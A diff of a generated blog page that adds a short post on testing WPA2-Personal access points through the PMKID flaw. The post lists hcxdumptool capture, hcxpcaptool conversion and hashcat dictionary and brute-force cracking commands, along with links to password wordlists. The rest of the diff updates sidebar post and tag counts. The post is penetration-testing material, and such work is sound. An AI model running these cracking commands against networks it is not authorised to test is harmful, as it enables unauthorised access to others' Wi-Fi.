@@ -455,9 +455,13 @@
         <h3 id="Testing-Wireless-AP-security"><a href="#Testing-Wireless-AP-security" class="headerlink" title="Testing Wireless AP security"></a>Testing Wireless AP security</h3><p>A new flaw in WPA2-Personal has been found which doesn’t require capturing the 4-way handshake as in KRACK. Wifi adapter will need to be capable on monitor mode. </p>
 <p>WPA2-EAP is not affected.  </p>
 <a id="more"></a>
+
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">## Capture the packet</span></span><br><span class="line">sudo hcxdumptool -o test.pcapng -i &lt;interface logical name&gt; --enable_status=1</span><br></pre></td></tr></table></figure>
+
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Kill network manager if warning shows</span></span><br><span class="line"><span class="comment"># warning: NetworkManager is running with pid 828</span></span><br><span class="line"><span class="comment"># warning: wpa_supplicant is running with pid 890</span></span><br><span class="line"><span class="comment"># &gt;&gt;&gt; sudo kill 828 890</span></span><br><span class="line"><span class="comment"># To restart: sudo systemctl start NetworkManager</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Convert into suitable hashcat format</span></span><br><span class="line">./hcxpcaptool -z test.16800 test.pcapng</span><br></pre></td></tr></table></figure>
+
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Dictionary attack with hashcat</span></span><br><span class="line">hashcat -m 16800 -a 0 -w 2 -o outfile test.16800 rockyou.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># Bruteforce with hashcat</span></span><br><span class="line">hashcat -m 16800 -a 3 -o oufile -session=brute test.16800 &lt;guess mask&gt;</span><br></pre></td></tr></table></figure>
+
 <h3 id="Password-lists"><a href="#Password-lists" class="headerlink" title="Password lists"></a>Password lists</h3><p>Crack station: <a href="https://crackstation.net/files/crackstation-human-only.txt.gz" target="_blank" rel="noopener">https://crackstation.net/files/crackstation-human-only.txt.gz</a></p>
 <p>Seclists: <a href="https://github.com/danielmiessler/SecLists/tree/master/Passwords" target="_blank" rel="noopener">https://github.com/danielmiessler/SecLists/tree/master/Passwords</a></p>
 <p>Rockyou: <a href="http://downloads.skullsecurity.org/passwords/rockyou.txt.bz2" target="_blank" rel="noopener">http://downloads.skullsecurity.org/passwords/rockyou.txt.bz2</a></p>
@@ -582,7 +586,7 @@
                 
                   <a href="/archives/">
                 
-                    <span class="site-state-item-count">25</span>
+                    <span class="site-state-item-count">27</span>
                     <span class="site-state-item-name">posts</span>
                   </a>
                 </div>
@@ -617,11 +621,7 @@
                     
                       
                     
-                      
-                    
-                      
-                    
-                    <span class="site-state-item-count">11</span>
+                    <span class="site-state-item-count">9</span>
                     <span class="site-state-item-name">categories</span>
                   </a>
                 </div>
@@ -728,7 +728,9 @@
                     
                       
                     
-                    <span class="site-state-item-count">45</span>
+                      
+                    
+                    <span class="site-state-item-count">46</span>
                     <span class="site-state-item-name">tags</span>
                   </a>
                 </div>
